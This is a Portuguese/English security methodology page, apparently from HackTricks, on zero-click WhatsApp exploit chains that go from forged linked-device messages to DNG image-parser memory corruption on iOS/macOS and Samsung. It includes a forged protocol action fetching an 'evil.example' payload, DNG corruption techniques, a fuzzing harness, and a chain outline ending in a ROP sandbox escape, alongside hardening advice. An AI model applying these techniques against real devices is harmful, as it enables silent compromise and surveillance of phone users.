# Zero-click Messaging → Image Parser Chains

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

- Trate **messaging app multi-device/companion protocols** como canais de controle remoto: mesmo quando campos do protocolo são assumidos como provenientes de dispositivos confiáveis, eles podem ser controlados pelo usuário e frequentemente podem ser replayed diretamente contra uma vítima para carregar conteúdo arbitrário com **0 user interaction**.
- Depois que qualquer app puder ser coagido a buscar mídia não confiável, mire no **shared OS media pipeline** (RawCamera on iOS/macOS, vendor parsers on Android OEM builds) com arquivos malformados para pivotar para fora do sandbox.
- Os bugs baseados em DNG no RawCamera e no parser da Samsung discutidos aqui são exemplos concretos, mas a técnica completa é um roteiro reutilizável para encadear **logic flaws → image parser memory corruption → full device compromise**.

## Remote content loading via WhatsApp linked-device commands

### Attack surface recap

A arquitetura "linked devices" do WhatsApp mantém o telefone principal e cada companion (desktop, tablet, telefone secundário) sincronizados via mensagens de protocolo estruturadas e criptografadas. Cada mensagem codifica:

- **Device metadata** (ID do dispositivo, capacidades, feature flags).
- **Action descriptors** (por exemplo, sync chats, fetch thumbnails, render remote content).
- **Arbitrary parameters** tais como URIs, MIME hints, chaves de paginação, etc.

Nos clientes Apple, o handler que processa esses pacotes de controle linked-device **implicitamente confiava** que um emparelhamento válido já havia ocorrido, então campos de alto impacto (por exemplo, `resource_url`, `open_media`, `sync_snapshot`) eram validados apenas minimamente. Uma mensagem maliciosa de um companion poderia, portanto:

1. Ser roteada para qualquer conta identificada pelo seu número de telefone.
2. Sobreviver à pilha de transporte (Noise protocol + WhatsApp protobuf framing) porque o receptor nunca verificou se o remetente era um dispositivo legitimamente pareado.
3. Alcançar o cliente iOS, onde o caminho de código vulnerável acionava automaticamente uma requisição HTTP(S) em segundo plano para a URL do atacante e parseava a resposta em um WebView/media renderer oculto.

### Practical workflow for auditors

1. **Capture legitimate linked-device traffic.** Anexe um debugger ou um script Frida ao cliente desktop/iOS e hook o handler pós-decriptação (por exemplo, `LinkedDevicesSyncHandler::processAction`). Faça dump dos payloads protobuf decodificados para aprender os tipos de ação e parâmetros disponíveis.
2. **Identify fields that cross trust boundaries.** Qualquer ação que carregue parâmetros `http_url`, `thumbnail_uri`, `download_url` ou `render_html` sem allow-lists estritas é um candidato a primitive de conteúdo remoto.
3. **Forge a malicious action.** Reuse o schema protobuf observado e modifique apenas os campos controlados pelo atacante. Uma visão JSON simplificada da estrutura lógica relevante é mostrada abaixo (o transporte real é protobuf/Noise, mas os campos semânticos coincidem):
```json
{
"op": "sync_action",
"device_id": "<attacker-companion>",
"payload": {
"target": "content_sync",
"resource_url": "https://evil.example/payload.html",
"media_type": "image/dng",
"flags": ["background_fetch", "render_inline"]
}
}
```
4. **Deliver to the victim.** Reenvie o pacote criado através do mesmo serviço do WhatsApp que normalmente encaminha o tráfego de dispositivos vinculados (por exemplo, usando um cliente desktop modificado ou um cliente Noise personalizado reutilizando as chaves da conta do atacante). Porque CVE-2025-55177 não vinculava ações a dispositivos autenticados, o cliente iOS/macOS da vítima aceitaria a mensagem e buscaria imediatamente a URL do atacante sem qualquer UI.  
5. **Instrument the fetch.** Observe a requisição HTTP(S) forçada e o renderer interno (WKWebView/ImageIO). Neste ponto você controla uma primitiva de entrega web zero-click dentro do WhatsApp.

## Transformando DNGs auto-decodificados em arma contra RawCamera

Uma vez que o atacante controla o que o WhatsApp carrega, o próximo objetivo é fazer com que iOS/macOS analise um arquivo malicioso **Digital Negative (DNG)** com o framework **RawCamera**. Qualquer URL embutida em `<img>`/CSS que resolva para um `.dng` será passada para o pipeline de imagens do sistema, invocando RawCamera mesmo que o próprio WhatsApp nunca tenha tratado DNGs explicitamente.

### Acionando RawCamera a partir do WhatsApp

- Sirva HTML que referencie o DNG por múltiplos mecanismos (por exemplo, `<img src="evil.dng">`, CSS `background-image: url('evil.dng')`, ou fontes `<picture>`) para cobrir diferentes caminhos de renderização.
- Garanta o MIME correto (`image/x-adobe-dng`) e pré-visualizações pequenas para que o loader não desista cedo por causa de heurísticas de tamanho.
- A sandbox de mídia do iOS transmitirá o arquivo para o RawCamera via `CGImageSourceCreateWithURL`, eventualmente atingindo o decoder vulnerável.

### Criando DNGs que corrompem memória (estilo CVE-2025-43300)

O bug reproduzido dependia de metadados inconsistentes que dessincronizavam a alocação de buffer das leituras reais de pixels. Alavancas típicas incluem:

- **Tile/strip descriptors**: Defina `TileByteCounts`/`StripByteCounts` com valores realistas, mas aumente `TileOffsets` para apontar além do buffer alocado.
- **Sub-IFD chains**: Embuta imagens secundárias com `ImageWidth`/`ImageLength` e `BitsPerSample` conflitantes para que o RawCamera calcule um buffer pequeno enquanto estágios posteriores confiam em dimensões controladas pelo atacante.
- **Opcode metadata**: Manipule entradas `OpcodeList3` para que o processamento por linha opere em índices escolhidos pelo atacante.

Um harness básico de mutação para caçar tais corrupções pode ser construído em torno do macOS, já que o mesmo código do RawCamera é distribuído no macOS/iOS/iPadOS:
```bash
#!/bin/bash
set -e
for sample in corpus/*.dng; do
radamsa "$sample" > /tmp/poc.dng
/System/Library/CoreServices/RawCamera.bundle/Contents/MacOS/RawCamera /tmp/poc.dng >/tmp/out 2>&1 || {
mv /tmp/poc.dng crashes/$(date +%s).dng
}
done
```
Cada crash em `RawCamera` lhe dá um novo primitive. O PoC publicado alcançou um clean out-of-bounds read/write confiável o suficiente para crashar o WhatsApp em iPhone, iPad e Mac.

## Construindo a 0-click chain

1. **Linked-device packet** → coagirá o WhatsApp a buscar `https://evil.example/payload.html` sem qualquer toque.
2. **Payload HTML** → referencia silenciosamente `evil.dng`, garantindo que RawCamera seja invocado pela media stack do SO.
3. **Malicious DNG** → abusa de tags crafted para disparar o RawCamera OOB e crashar/ownar o image decoder.
4. **Post-corruption exploitation** → adiciona info-leak gadgets (por exemplo, abusando de heap metadata previsível) e arma uma ROP/JOP chain para escapar do sandbox do WhatsApp e atingir contextos com mais privilégios.

Como cada passo é automático, o atacante precisa apenas do número de telefone da vítima. Nenhuma notification, banner ou prompt é exibido no dispositivo alvo.

## Samsung vendor image parser parallels

O bulletin da Samsung para CVE-2025-21043 confirmou que a sua image parsing stack proprietária (usada por Gallery, Messages e também indiretamente pelo WhatsApp) sofreu um **out-of-bounds write** alcançável através de mídia não confiável. A metodologia de exploração espelha a cadeia da Apple:

- Identificar um auto-preview vector (chat thumbnails, notification previews, share sheets) que parseia o arquivo do atacante com as bibliotecas `libimagecodec`/`libOneUI_ImageDecoder` da Samsung.
- Diff de updates da OEM ou fuzz dos parsers com arquivos RAW/DNG malformed até ver corrupções de memória semelhantes ao crash do RawCamera (heap metadata clobber, register control, etc.).
- Entregar o arquivo crafted por qualquer canal que já auto-carregue conteúdo (por exemplo, o mesmo linked-device primitive, WhatsApp preview fetchers, ou os push-to-talk waveform previews do Android).

Uma vez que exista um OOB write no parser do vendor, combiná-lo com o auto-fetch primitive do WhatsApp gera outra zero-click chain em dispositivos Samsung.

## Checklist de testes e hardening

- **Protocol validation**: Aplicar allow-lists estritas para cada ação linked-device. Comandos de companion que requisitem fetch/render devem provar emparelhamento do dispositivo (signing the payload) e a URL deve corresponder a uma allow-list ou blob assinado.
- **Transport replay countermeasures**: Vincular cada ação a uma chave por-dispositivo e rejeitar packets cuja sender key seja desconhecida, mesmo se a sintaxe protobuf estiver correta.
- **Media pipeline restrictions**: Apps de alto nível devem permitir apenas MIME types aprovados e rejeitar explicitamente RAW/DNG a menos que a funcionalidade seja necessária.
- **Parser fuzzing regression tests**: Manter um corpus de arquivos RAW/DNG malformed e rodá-los contra RawCamera/vendor decoders após cada atualização.
- **Crash triage automation**: Anexar sanitizers via `DYLD_INSERT_LIBRARIES` ou MTE em dispositivos de fuzz para capturar condições OOB sutis antes que atacantes o façam.

## References

- [DNGerousLINK: A Deep Dive into WhatsApp 0-Click Exploits on iOS and Samsung Devices](https://media.ccc.de/v/39c3-dngerouslink-a-deep-dive-into-whatsapp-0-click-exploits-on-ios-and-samsung-devices)

{{#include ../../banners/hacktricks-training.md}}
